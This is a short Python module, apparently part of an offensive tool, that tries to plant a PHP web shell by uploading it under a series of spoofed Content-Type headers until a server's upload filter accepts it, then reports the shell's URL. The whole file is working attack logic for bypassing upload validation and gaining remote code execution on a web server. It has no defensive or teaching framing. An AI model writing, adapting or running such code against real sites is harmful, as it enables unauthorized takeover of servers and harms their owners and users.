"""Content-Type header bypass technique"""

from ..config import CONTENT_TYPES
from ..utils.name_generator import generate_shell_name

def attempt_content_type_bypass(request_handler, file_finder, upload_url, shell_content):
    """
    Bypass using manipulated Content-Type header
    """
    print("[*] Attempting Content-Type bypass...")
    
    filename = f"{generate_shell_name()}.php"
    
    for content_type in CONTENT_TYPES:
        files = {
            'file': (filename, shell_content, content_type)
        }
        
        response = request_handler.post(upload_url, files=files)
        
        if response and response.status_code == 200:
            shell_url = file_finder.find_uploaded_file(filename, response)
            if shell_url:
                print(f"    [+] SUCCESS with {content_type}! Shell at: {shell_url}")
                return shell_url
    
    print("    [-] Content-Type bypass failed")
    return None